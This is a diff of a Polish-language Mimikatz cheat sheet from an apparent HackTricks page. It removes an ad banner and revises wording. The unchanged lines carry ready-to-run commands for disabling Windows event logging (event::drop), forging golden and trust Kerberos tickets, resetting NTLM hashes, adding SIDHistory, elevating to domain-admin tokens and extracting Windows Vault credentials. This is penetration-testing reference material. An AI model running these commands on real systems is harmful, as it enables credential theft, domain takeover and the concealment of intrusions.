@@ -2,12 +2,6 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-Pogłęb swoją wiedzę w zakresie **Mobile Security** z 8kSec Academy. Opanuj bezpieczeństwo iOS i Androida dzięki naszym kursom w trybie samodzielnym i zdobądź certyfikat:
-
-{% embed url="https://academy.8ksec.io/" %}
-
 **Ta strona opiera się na jednej z [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Sprawdź oryginał, aby uzyskać więcej informacji!
 
 ## LM i hasła w postaci czystego tekstu w pamięci
@@ -37,21 +31,21 @@ To pozwala na zrzucenie pamięci `lsass.exe` do pliku, który następnie można 
 ```
 ## Opcje Mimikatz
 
-Manipulacja dziennikami zdarzeń w Mimikatz obejmuje dwa główne działania: czyszczenie dzienników zdarzeń i patchowanie usługi zdarzeń, aby zapobiec rejestrowaniu nowych zdarzeń. Poniżej znajdują się polecenia do wykonania tych działań:
+Manipulacja dziennikami zdarzeń w Mimikatz obejmuje dwa główne działania: czyszczenie dzienników zdarzeń i łatanie usługi zdarzeń, aby zapobiec rejestrowaniu nowych zdarzeń. Poniżej znajdują się polecenia do wykonania tych działań:
 
 #### Czyszczenie dzienników zdarzeń
 
 - **Polecenie**: To działanie ma na celu usunięcie dzienników zdarzeń, co utrudnia śledzenie złośliwych działań.
 - Mimikatz nie zapewnia bezpośredniego polecenia w swojej standardowej dokumentacji do czyszczenia dzienników zdarzeń bezpośrednio za pomocą wiersza poleceń. Jednak manipulacja dziennikami zdarzeń zazwyczaj obejmuje użycie narzędzi systemowych lub skryptów poza Mimikatz do czyszczenia konkretnych dzienników (np. używając PowerShell lub Podglądu zdarzeń systemu Windows).
 
-#### Funkcja eksperymentalna: Patchowanie usługi zdarzeń
+#### Funkcja eksperymentalna: Łatanie usługi zdarzeń
 
 - **Polecenie**: `event::drop`
 - To eksperymentalne polecenie ma na celu modyfikację zachowania usługi rejestrowania zdarzeń, skutecznie zapobiegając rejestrowaniu nowych zdarzeń.
 - Przykład: `mimikatz "privilege::debug" "event::drop" exit`
 
 - Polecenie `privilege::debug` zapewnia, że Mimikatz działa z niezbędnymi uprawnieniami do modyfikacji usług systemowych.
-- Polecenie `event::drop` następnie patchuje usługę rejestrowania zdarzeń.
+- Polecenie `event::drop` następnie łata usługę rejestrowania zdarzeń.
 
 ### Ataki na bilety Kerberos
 
@@ -85,9 +79,9 @@ Przykład:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
-### Tworzenie Zaufanego Biletu
+### Tworzenie Biletu Zaufania
 
-Zaufane Bilety są używane do uzyskiwania dostępu do zasobów w różnych domenach, wykorzystując relacje zaufania. Kluczowe polecenie i parametry:
+Bilety Zaufania są używane do uzyskiwania dostępu do zasobów w różnych domenach poprzez wykorzystanie relacji zaufania. Kluczowe polecenie i parametry:
 
 - Polecenie: Podobne do Złotego Biletu, ale dla relacji zaufania.
 - Parametry:
@@ -100,7 +94,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 ```
 ### Dodatkowe polecenia Kerberos
 
-- **Lista biletów**:
+- **Wyświetlanie biletów**:
 
 - Polecenie: `kerberos::list`
 - Wyświetla wszystkie bilety Kerberos dla bieżącej sesji użytkownika.
@@ -153,7 +147,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: Pobiera informacje o uwierzytelnianiu zaufania.
+- **LSADUMP::Trust**: Pobiera informacje o uwierzytelnieniu zaufania.
 - `mimikatz "lsadump::trust" exit`
 
 ### Różne
@@ -184,7 +178,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **SID::add/modify**: Zmienia SID i SIDHistory.
 
 - Dodaj: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- Zmień: _Brak konkretnego polecenia dla zmiany w oryginalnym kontekście._
+- Zmień: _Brak konkretnego polecenia do zmiany w oryginalnym kontekście._
 
 - **TOKEN::Elevate**: Podszywa się pod tokeny.
 - `mimikatz "token::elevate /domainadmin" exit`
@@ -203,10 +197,5 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Ekstrahuje hasła z Windows Vault.
 - `mimikatz "vault::cred /patch" exit`
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-Zgłębiaj swoją wiedzę w **Bezpieczeństwie Mobilnym** z 8kSec Academy. Opanuj bezpieczeństwo iOS i Androida dzięki naszym kursom w trybie samodzielnym i uzyskaj certyfikat:
-
-{% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
